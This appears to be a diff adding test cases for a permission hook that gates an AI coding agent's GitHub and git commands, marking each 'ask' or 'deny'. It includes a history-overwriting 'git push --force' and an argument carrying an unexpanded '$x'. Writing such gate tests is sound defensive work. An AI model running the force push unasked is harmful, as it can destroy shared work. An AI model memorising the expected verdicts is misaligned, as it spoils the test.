+{"id":"G21.028","verdict":"ask","setup":"lp","command":"gh pr create --repo o/r --base audit/x --head feat/s1 --title \"t\" --body-file docs/work/s1/pr-body.md --web","reason":"acts on a pull request"}
+{"id":"G21.029","verdict":"ask","setup":"lpnobaseok","command":"gh pr create --repo o/r --base audit/x --head feat/s1 --title \"t\" --body-file docs/work/s1/pr-body.md","reason":"acts on a pull request"}
+{"id":"G21.030","verdict":"ask","setup":"lpnobody","command":"gh pr create --repo o/r --base audit/x --head feat/s1 --title \"t\" --body-file docs/work/s1/pr-body.md","reason":"acts on a pull request"}
+{"id":"G21.031","verdict":"ask","setup":"lp","command":"gh pr create --repo o/r --base audit/x --head feat/s1 --title \"t\" --body \"x\"","reason":"acts on a pull request"}
+{"id":"G21.032","verdict":"ask","setup":"lp","command":"gh pr create --base audit/x --repo o/r --head feat/s1 --title \"t\" --body-file docs/work/s1/pr-body.md","reason":"acts on a pull request"}
+{"id":"G21.033","verdict":"ask","setup":"lp","command":"gh pr create --repo o/r --base audit/x --head feat/s1 --title \"t $x\" --body-file docs/work/s1/pr-body.md","reason":"acts on a pull request"}
+{"id":"G21.034","verdict":"ask","setup":"lpbasemain","command":"gh pr create --repo o/r --base main --head feat/s1 --title \"t\" --body-file docs/work/s1/pr-body.md","reason":"acts on a pull request"}
+{"id":"G21.035","verdict":"ask","setup":"lp","command":"gh pr merge 1","reason":"acts on a pull request"}
+{"id":"G21.035.2","verdict":"ask","setup":"lp","command":"gh pr edit 1 --title x","reason":"acts on a pull request"}
+{"id":"G21.035.3","verdict":"ask","setup":"lp","command":"gh pr close 1","reason":"acts on a pull request"}
+{"id":"G21.035.4","verdict":"ask","setup":"lp","command":"git push --force -u origin feat/s1","reason":"FORCE push"}
+{"id":"G21.035.5","verdict":"ask","setup":"lp","command":"gh release create v1","reason":"writes to GitHub"}
+{"id":"G21.036","verdict":"deny","setup":"lpbody","command":"gh pr create --repo o/r --base audit/x --head feat/s1 --title \"t\" --body-file docs/work/s1/pr-body.md","reason":"attribution line in a gh body"}
+{"id":"G21.037","verdict":"ask","setup":"lpslow","command":"git push -u origin feat/s1","reason":"pushes to a remote"}
+{"id":"G21.037.2","verdict":"ask","setup":"lpslowb","command":"git push -u origin feat/s1","reason":"pushes to a remote"}
+{"id":"G21.038","verdict":"ask","setup":"lpbadjson","command":"git push -u origin feat/s1","reason":"pushes to a remote"}
+{"id":"G21.038.2","verdict":"ask","setup":"lpv2","command":"git push -u origin feat/s1","reason":"pushes to a remote"}
